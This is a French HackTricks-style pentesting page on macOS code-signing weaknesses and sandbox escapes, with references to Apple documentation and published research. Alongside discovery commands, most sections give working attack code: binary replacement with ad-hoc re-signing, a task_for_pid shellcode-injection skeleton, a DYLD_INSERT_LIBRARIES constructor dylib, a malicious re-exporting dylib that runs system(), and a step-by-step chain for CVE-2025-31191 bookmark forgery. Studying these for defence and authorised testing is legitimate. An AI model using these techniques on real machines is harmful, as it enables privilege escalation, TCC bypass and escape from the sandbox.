# Faiblesses de la signature de code macOS et Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Binaires signés ad hoc

### Informations de base

La **signature ad hoc** (`CS_ADHOC`) crée une signature de code avec **aucune chaîne de certificats**. Elle hache tout de même le code signé, de sorte que la validation peut détecter toute modification, mais elle ne fournit aucune identité de développeur qu'un autre composant puisse authentifier. Remplacer et re-signer l'exécutable produit un CodeDirectory/CDHash différent.<sup>[[1]](#references)[[4]](#references)</sup>

Sur les Mac Apple Silicon, tous les exécutables nécessitent au minimum une signature ad hoc. Cela signifie que vous trouverez des signatures ad hoc sur de nombreux outils de développement, packages Homebrew et utilitaires tiers.

### Pourquoi c'est important

- **Aucune identité de signataire vérifiable** — les vérifications qui acceptent uniquement un chemin, un statut ad hoc ou un identifiant non épinglé ne peuvent pas établir qui a produit le binaire.
- Les binaires ad hoc tiers situés dans des **positions privilégiées** (FDA, daemons, helpers) sont des cibles prioritaires lorsque leur fichier ou un répertoire parent est accessible en écriture.
- Un CDHash, une designated-requirement ou une vérification TCC fondée sur une requirement **détecte** bien le remplacement. Une policy fondée sur un chemin peut ne pas le détecter ; inspectez la requirement réelle et retestez le grant au lieu de supposer qu'il survit à une nouvelle signature.

### Découverte
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attaque : Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Processus débogables (get-task-allow)

### Informations de base

L’**entitlement `com.apple.security.get-task-allow`** (ou le flag `CS_GET_TASK_ALLOW`) permet à un debugger autorisé d’obtenir le task port du processus, même lorsque le Hardened Runtime l’empêcherait normalement. Un debugger qui réussit peut lire la mémoire, modifier les registres, injecter du code et contrôler l’exécution.<sup>[[3]](#references)</sup>

Cela est prévu **uniquement pour les builds de développement**. Cependant, certains binaires tiers sont distribués avec cet entitlement en production.

> [!CAUTION]
> Un binaire de production avec `get-task-allow` constitue une primitive d’exploitation puissante. `taskgated`, l’identité de l’appelant, le sandboxing, les entitlements du debugger et l’autorisation Developer Tools déterminent également si un client donné peut obtenir le task port ; effectuez des tests avec `lldb`/`debugserver` ainsi qu’avec l’injecteur prévu. Une fois l’attachement réussi, le code injecté s’exécute avec les entitlements, les autorisations TCC et le contexte de sécurité de la cible.

### Découverte
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attaque : Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Absence de Library Validation + environnement DYLD

### Désactivation de la Runtime Library Validation

L’entitlement privé **`com.apple.private.security.clear-library-validation`** ne désactive pas la library validation au lancement du processus. Il permet plutôt au processus d’appeler `csops(..., CS_OPS_CLEAR_LV, ...)` sur lui-même au runtime. XNU efface alors `CS_REQUIRE_LV | CS_FORCED_LV`, à condition que l’appelant dispose de l’entitlement et satisfasse aux vérifications supplémentaires du handler. Par conséquent, un processus peut devenir une cible viable pour l’injection de library uniquement après avoir atteint le code path qui efface la library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### La combinaison fatale

Lorsqu’un binary possède **les deux** :<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (charge n’importe quel dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accepte les variables d’environnement DYLD)

Il s’agit d’une combinaison à forte valeur pour l’injection de code, car le Hardened Runtime autorise à la fois la library non approuvée et la variable d’environnement DYLD. Le contexte de lancement peut tout de même supprimer les variables DYLD (par exemple, dans des execution paths protégés ou privilégiés) ; vérifiez donc l’invocation exacte plutôt que de considérer la paire d’entitlements comme inconditionnelle.

### Découverte
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Exceptions temporaires du Sandbox

### Comment elles affaiblissent le Sandbox

Les exceptions temporaires du Sandbox (`com.apple.security.temporary-exception.*`) créent des brèches dans l'App Sandbox :<sup>[[2]](#references)</sup>

| Exception | Ce qu'elle permet |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Se connecter aux services XPC/Mach à l'échelle du système |
| `temporary-exception.files.absolute-path.read-write` | Lire/écrire des fichiers en dehors du conteneur de l'application |
| `temporary-exception.iokit-user-client-class` | Ouvrir des connexions user-client IOKit |
| `temporary-exception.shared-preference.read-only` | Lire les préférences d'autres applications |
| `temporary-exception.files.home-relative-path.read-write` | Accéder aux chemins relatifs à `~` |

### Exceptions Mach-Lookup = Primitive de Sandbox Escape

L'exception la plus dangereuse est **mach-lookup** — elle permet à une application sandboxée de communiquer avec des daemons privilégiés :
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Évasion de Sandbox via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Les vérifications de signature de code ne garantissent pas l’intégrité du client XPC

Un service XPC peut authentifier une connexion en extrayant l’état de signature du code depuis son jeton d’audit et en acceptant un **platform binary** Apple ou un client portant `CS_REQUIRE_LV`/`CS_FORCED_LV`. Ces tests décrivent l’exécutable et certains indicateurs du processus sélectionnés ; ils ne prouvent pas que l’espace d’adressage actuel contient uniquement du code fiable. Des recherches sur les services ImageCapture ont montré qu’un binaire Apple injectable tel que `/bin/ls` pouvait charger une dylib de l’attaquant via `DYLD_INSERT_LIBRARIES`, puis se connecter en tant que client de la plateforme. Une vérification complémentaire des indicateurs de library-validation a également été contournée avant qu’Apple ne modifie le service afin d’exiger son entitlement d’autorisation privé dans macOS 15.<sup>[[6]](#references)</sup>

### Workflow d’audit offensif

1. Reverse `listener:shouldAcceptNewConnection:` (ou le gestionnaire XPC bas niveau équivalent) et identifiez les décisions fondées uniquement sur `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` ou `CS_FORCED_LV`.
2. Énumérez les clients signés par Apple capables de parler le protocole, puis inspectez Hardened Runtime et les entitlements. Une signature de plateforme seule ne prouve pas que l’injection DYLD est bloquée.
3. Testez le candidat sur le **build macOS cible**. Si une dylib de constructeur est chargée, établissez la connexion au service depuis ce constructeur afin que le jeton d’audit appartienne au processus de plateforme accepté.
4. Testez à nouveau chaque correctif du fournisseur : l’ajout d’un autre indicateur mutable de l’état du processus à la même décision d’autorisation peut ne pas supprimer la primitive de confused deputy.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Le comportement de DYLD, la politique AMFI et les vérifications côté service varient selon les versions de macOS. Un échec contre un hôte entièrement patché ne prouve pas que la même chaîne a échoué sur la version vulnérable.

---

## Falsification de Security-Scoped Bookmark (CVE-2025-31191)

Les security-scoped bookmarks conservent le choix de fichier d'un utilisateur entre les lancements. Une sandbox extension est liée au démarrage du système ; `ScopedBookmarkAgent` la valide donc et crée un bookmark de longue durée authentifié par HMAC. Lorsque l'application présente ultérieurement ce bookmark, l'agent le valide et émet une nouvelle sandbox extension. Le secret de signature est stocké dans le login keychain et une clé propre à l'application est dérivée à l'aide de l'identifiant du bundle.<sup>[[7]](#references)</sup>

Sur les systèmes concernés, l'ACL du keychain empêchait un processus non fiable de **lire** le secret `com.apple.scopedbookmarksagent.xpc`, mais n'empêchait pas sa suppression. Une application sandboxée compromise pouvait remplacer l'élément par un secret connu et une ACL contrôlée par l'attaquant, dériver la clé HMAC propre à l'application, falsifier des entrées dans le bookmark plist du container accessible en écriture, puis demander à `ScopedBookmarkAgent` de les échanger contre des extensions d'accès aux fichiers. Ainsi, toute application sandboxée utilisant des security-scoped bookmarks devenait potentiellement un vecteur de sandbox escape permettant l'accès arbitraire aux fichiers, sans interaction supplémentaire avec le file picker. Apple a corrigé le problème dans les mises à jour de sécurité du 31 mars 2025.<sup>[[7]](#references)</sup>

### Triage et chaîne d'attaque
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
La séquence d'exploitation sur un hôte vulnérable est la suivante :

1. Obtenir une exécution de code à l'intérieur d'une app sandboxée qui utilise des persistent scoped bookmarks.
2. Remplacer l'élément de signature du keychain de l'agent par un secret connu et une ACL permissive.
3. Calculer `HMAC-SHA256(key=known_secret, data=bundle_id)` et forger un bookmark vers un chemin utile dans le bookmark store accessible en écriture de l'app.
4. Déclencher le chemin normal de résolution des bookmarks de l'application afin que `ScopedBookmarkAgent` renvoie une sandbox extension.
5. Utiliser le nouvel accès aux fichiers pour écraser une cible d'exécution ou de données située hors du sandbox et accessible à cet utilisateur.

Il s'agit d'une **technique pour versions corrigées** : utilisez-la pour comprendre la frontière de confiance et évaluer les systèmes non corrigés, et non comme une hypothèse concernant les versions actuelles. Pour les tests actuels, concentrez-vous sur l'analyse des bookmarks, la liaison d'identité, le cycle de vie des éléments du keychain et le comportement de confused deputy autour de l'agent.

---

## Entitlements privés Apple

### Ce qu'ils sont

Les entitlements préfixés par `com.apple.private.*` donnent accès à des **API internes à Apple** qui ne sont ni documentées ni disponibles pour les développeurs tiers. Les binaires tiers disposant d'entitlements privés les ont obtenus via un certificat enterprise, MDM ou une distribution hors App Store.

### Entitlements privés dangereux

| Entitlement | Capacité |
|---|---|
| `com.apple.private.tcc.manager` | Lecture/écriture complète de la base de données TCC |
| `com.apple.private.tcc.allow` | Accès à des services TCC spécifiques |
| `com.apple.private.security.no-sandbox` | Exécution sans sandbox |
| `com.apple.private.iokit` | Accès direct aux pilotes IOKit |
| `com.apple.private.kernel.\*` | Accès aux interfaces du kernel |
| `com.apple.private.xpc.launchd.job-label` | Enregistrer et gérer des jobs launchd |
| `com.apple.rootless.install` | Écriture vers des chemins protégés par SIP |

### Découverte
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Profils de sandbox personnalisés (SBPL)

### Ce qu'ils sont

Les binaires peuvent intégrer des **profils de sandbox personnalisés** écrits en SBPL (Seatbelt Profile Language). Ces profils peuvent être plus restrictifs OU **plus permissifs** que l'App Sandbox par défaut.

### Audit des profils personnalisés
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Chemins de bibliothèques accessibles en écriture

### Ce qu'ils sont

Lorsqu'un binaire charge une bibliothèque dynamique depuis un chemin sur lequel l'utilisateur actuel peut **écrire**, la bibliothèque peut être remplacée par du code malveillant.

### Découverte
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attaque : Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Guide de signature de code](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (opérations `CS_OPS_*` et `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (gestionnaire de `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Une nouvelle ère pour les sandbox escapes macOS : exploration d'une surface d'attaque négligée et découverte de plus de 10 nouvelles vulnérabilités](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analyse de CVE-2025-31191 : une sandbox escape macOS basée sur les security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
